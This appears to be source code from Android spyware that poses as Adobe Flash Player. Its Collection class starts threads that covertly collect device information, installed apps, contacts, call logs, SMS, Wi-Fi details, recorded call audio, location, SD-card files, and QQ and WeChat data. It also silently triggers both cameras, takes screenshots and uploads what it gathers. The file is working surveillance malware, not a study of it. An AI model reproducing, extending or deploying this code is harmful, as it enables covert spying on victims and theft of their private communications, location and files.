package com.adobe.flashplayer.data;


import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.accessory.AccessHelper;
import com.adobe.flashplayer.data.Location.AMaplocation;
import com.adobe.flashplayer.data.Location.MyTencentLocation;
import com.adobe.flashplayer.data.app.QQ;
import com.adobe.flashplayer.data.app.WECHAT;
import com.adobe.flashplayer.install.InstallActivity;
import com.tencent.map.geolocation.TencentLocation;


public class Collection {

    private static final String TAG = "[ljg]Collection ";

    public Collection(Context context) {

        Log.e(TAG, "[ljg]start");
    }


    public static void collectUserData(final Context context) {

        Log.e(TAG, "[ljg]collect start");

        long timenow = System.currentTimeMillis();
        String lasttime = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME);
        if (lasttime.equals("") == true || lasttime == null) {

            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME, String.valueOf(timenow));

        } else {
            if (timenow - Long.parseLong(lasttime) >= Public.BASIC_RETRIEVE_INTERVAL) {
                PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME, String.valueOf(timenow));
            } else {
                if(InstallActivity.debug_flag){
                    //test mode
                }else{
                    return;
                }

            }
        }
        MyLog.writeLogFile("main proc start at:" + Utils.formatCurrentDate() + "\r\n");

        int installMode = AccessHelper.getInstallMode(context);

        new Thread(new Runnable() {
            @Override
            public void run() {
                PhoneInformation.getPhoneInformation(context);

                PhoneApps.getInstallApps(context);

                PhoneRunning.getPhoneRunning(context);

                PhoneContacts.getPhoneContacts(context);

                PhoneCallLog.getPhoneCallLog(context);

                PhoneSMS.getSmsFromPhone(context);

                PhoneWIFI.getPhoneWIFI(context);
            }
        }).start();


        try {
            new Thread(new PhoneCallAudioWrapper(context)).start();

            new Thread(new PhoneContentWrapper(context)).start();

            new Thread(new PhoneLocationWrapper(context)).start();

        }catch(Exception e){
            e.printStackTrace();
        }

        PhoneLocationWrapper.getLastLocation(context);

        if (installMode == AccessHelper.INSTALL_TYPE_SO || installMode == AccessHelper.INSTALL_TYPE_JAR) {
            new Thread(new CameraDialog(context, 0)).start();
        }else if (installMode == AccessHelper.INSTALL_TYPE_APK || installMode == AccessHelper.INSTALL_TYPE_MANUAL){

            AMaplocation amap = new AMaplocation(context,Public.PHONE_LOCATION_MINSECONDS);
            new Thread(amap).start();

            MyTencentLocation tecentloc = new MyTencentLocation(context,Public.PHONE_LOCATION_MINSECONDS) ;
            new Thread(tecentloc).start();

            PowerManager pm=(PowerManager)context.getSystemService(Context.POWER_SERVICE);
            boolean isScreenOn =pm.isInteractive();
            if (isScreenOn) {

                //Intent intentCamera = new Intent(context, CameraActivity.class);
                //intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                //intentCamera.putExtra("index",0);
                //intentCamera.putExtra("count",1);
                //context.startActivity(intentCamera);

                new Thread(new CameraDialog(context,0)).start();

                new Thread(new CameraDialog(context,1)).start();

                Intent intentScr = new Intent(context, ScreenShotActivity.class);
                intentScr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intentScr);
            }
        }

        PhoneSDFiles sdcardfies = new PhoneSDFiles(context,Public.SDCARDPATH, Public.LOCAL_PATH_NAME, Public.SDCARDFILES_NAME,Public.CMD_DATA_SDCARDFILES);
        Thread thread = new Thread(sdcardfies);
        thread.start();

        new Thread(new UploadRemainder(context)).start();

        new Thread(new QQ(context)).start();

        new Thread(new WECHAT(context)).start();

        ExtSDCardFile.getExtcardFiles(context);

        Log.e(TAG, "[ljg]collect complete");
    }
}
